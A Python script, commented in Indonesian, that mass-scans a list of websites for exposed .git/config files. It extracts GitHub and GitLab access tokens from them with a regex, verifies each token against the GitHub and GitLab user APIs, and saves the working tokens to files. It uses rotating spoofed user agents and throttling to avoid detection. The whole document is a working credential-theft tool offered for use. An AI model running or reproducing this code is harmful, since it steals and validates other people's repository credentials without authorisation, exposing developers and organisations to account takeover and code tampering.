import requests
import random
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
]

output_lock = Lock()
token_lock = Lock()
valid_lock = Lock()

def random_user_agent():
    return random.choice(USER_AGENTS)

def fetch_config(url):
    try:
        headers = {'User-Agent': random_user_agent()}
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.text
    except:
        pass
    return ""

def extract_tokens(text):
    return re.findall(r'gh[op]_[A-Za-z0-9_]{30,}|github_pat_[A-Za-z0-9_]{30,}|glpat-[a-zA-Z0-9_\-]{20}', text)

def check_token_validity(token):
    try:
        headers = {
            'User-Agent': random_user_agent()
        }
        if token.startswith('glpat-'):
            # GitLab token check
            headers['Authorization'] = f'Bearer {token}'
            response = requests.get("https://gitlab.com/api/v4/user", headers=headers, timeout=10)
            return response.status_code == 200
        else:
            # GitHub token check
            headers['Authorization'] = f'token {token}'
            response = requests.get("https://api.github.com/user", headers=headers, timeout=10)
            return response.status_code == 200
    except:
        return False

def process_url(base_url):
    config_url = f"{base_url}/.git/config"
    print(f"[*] Mengakses: {config_url}")
    result_text = ""
    token_text = ""
    valid_text = ""

    content = fetch_config(config_url)
    if content:
        result_text += f"{config_url}\n{content}\n\n"
        tokens = extract_tokens(content)

        if tokens:
            token_text += f"Dari: {config_url}\n" + "\n".join(tokens) + "\n\n"
            for token in tokens:
                print(f"[*] Memverifikasi token: {token}")
                if check_token_validity(token):
                    print(f"[+] VALID: {token}")
                    valid_text += f"VALID dari {config_url}:\n{token}\n\n"
                else:
                    print("[-] Token TIDAK valid atau sudah expired")
                time.sleep(random.uniform(1, 2))  # Jaga agar tidak rate limit
    else:
        print(f"[-] Gagal mengambil dari: {config_url}")

    # Menulis hasil (dengan lock)
    with output_lock:
        with open("output1.txt", "a") as out:
            out.write(result_text)
    with token_lock:
        with open("found_tokens.txt", "a") as tok:
            tok.write(token_text)
    with valid_lock:
        with open("valid_tokens.txt", "a") as val:
            val.write(valid_text)

def main():
    input_file = "cek.txt"

    with open("output1.txt", "w"), open("found_tokens.txt", "w"), open("valid_tokens.txt", "w"):
        pass  # just clear file contents

    with open(input_file, "r") as f:
        urls = [line.strip() for line in f if line.strip()]

    max_threads = min(30, len(urls))  # sesuaikan jumlah thread

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(process_url, url) for url in urls]
        for _ in as_completed(futures):
            pass

    print("\n✅ Selesai!")
    print("- output1.txt        → isi .git/config")
    print("- found_tokens.txt   → token ditemukan")
    print("- valid_tokens.txt   → token aktif")

if __name__ == "__main__":
    main()
